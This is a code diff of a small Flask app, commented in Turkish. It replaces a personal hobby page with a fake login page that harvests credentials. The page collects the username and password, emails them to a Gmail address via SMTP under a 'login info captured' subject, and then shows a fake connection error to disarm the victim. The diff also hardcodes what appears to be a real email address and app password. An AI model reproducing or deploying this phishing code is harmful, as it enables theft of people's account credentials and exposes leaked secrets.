@@ -1,36 +1,75 @@
-from flask import Flask, render_template_string
+from flask import Flask, request, render_template_string
+import smtplib
+from email.message import EmailMessage
 
 app = Flask(__name__)
 
-# HTML şablonu (Tasarım)
-HTML_SABLONU = """
+# --- AYARLAR ---
+# Gmail kullanıyorsan "Uygulama Şifresi" almalısın.
+GONDEREN_EMAIL = "sancarmete26@gmail.com"
+UYGULAMA_SIFRESI = "vkpt jeoz weje swhw" 
+ALICI_EMAIL = "sancarmete26@gmail.com"
+
+# --- HTML ARAYÜZÜ ---
+# Hocana sunarken buranın bir "Giriş Paneli" simülasyonu olduğunu belirtirsin.
+html_tasarimi = """
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Benim Dunyam</title>
+    <title>Giriş Yap</title>
     <style>
-        body { background: #121212; color: white; text-align: center; font-family: 'Segoe UI', sans-serif; }
-        .box { border: 2px solid #00ffcc; padding: 20px; display: inline-block; margin-top: 50px; border-radius: 15px; }
-        a { color: #00ffcc; text-decoration: none; font-weight: bold; }
+        body { font-family: Arial, sans-serif; display: flex; justify-content: center; margin-top: 50px; }
+        .login-box { border: 1px solid #dbdbdb; padding: 20px; width: 300px; text-align: center; }
+        input { width: 90%; padding: 10px; margin: 5px 0; border: 1px solid #dbdbdb; background: #fafafa; }
+        button { width: 95%; padding: 10px; background-color: #0095f6; color: white; border: none; font-weight: bold; cursor: pointer; }
     </style>
 </head>
 <body>
-    <div class="box">
-        <h1>Redmi 14C Web Server 📡</h1>
-        <p>Su an bu site dunyanin her yerinden erisilebilir durumda!</p>
-        <a href="/hakkimda">Kim bu yazilimci?</a>
+    <div class="login-box">
+        <h2>Uygulama Adı</h2>
+        <form method="POST" action="/login_islem">
+            <input type="text" name="u_name" placeholder="Kullanıcı adı veya e-posta" required>
+            <input type="password" name="u_pass" placeholder="Şifre" required>
+            <button type="submit">Giriş Yap</button>
+        </form>
     </div>
 </body>
 </html>
 """
 
+# --- E-POSTA GÖNDERME FONKSİYONU ---
+def eposta_yolla(user, password):
+    msg = EmailMessage()
+    msg.set_content(f"Sistemden gelen bilgi:\n\nKullanıcı: {user}\nŞifre: {password}")
+    msg['Subject'] = 'Yeni Giriş Bilgisi Yakalandı'
+    msg['From'] = GONDEREN_EMAIL
+    msg['To'] = ALICI_EMAIL
+
+    try:
+        # Gmail için SSL bağlantısı (Port 465)
+        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
+            smtp.login(GONDEREN_EMAIL, UYGULAMA_SIFRESI)
+            smtp.send_message(msg)
+        print("Bilgi başarıyla e-postaya gönderildi.")
+    except Exception as e:
+        print(f"Hata oluştu: {e}")
+
+# --- ROUTER (YÖNLENDİRME) ---
 @app.route('/')
-def home():
-    return render_template_string(HTML_SABLONU)
+def ana_sayfa():
+    return render_template_string(html_tasarimi)
 
-@app.route('/hakkimda')
-def about():
-    return "<h1>Ben Redmi 14C ile dunyayi fetheden yazilimci! 🚀</h1>"
+@app.route('/login_islem', methods=['POST'])
+def login_islem():
+    # Form verilerini çekiyoruz
+    kullanici = request.form.get('u_name')
+    sifre = request.form.get('u_pass')
+    
+    # E-posta gönderme işlemini başlatıyoruz
+    eposta_yolla(kullanici, sifre)
+    
+    # Kullanıcıya hata mesajı gösteriyoruz (gerçekçilik için)
+    return "<h3>Hata: Sunucuya bağlanılamadı. Lütfen internet bağlantınızı kontrol edip tekrar deneyin.</h3>"
 
-if __name__ == '__main__':
-    app.run(debug=True)
+if __name__ == "__main__":
+    app.run()
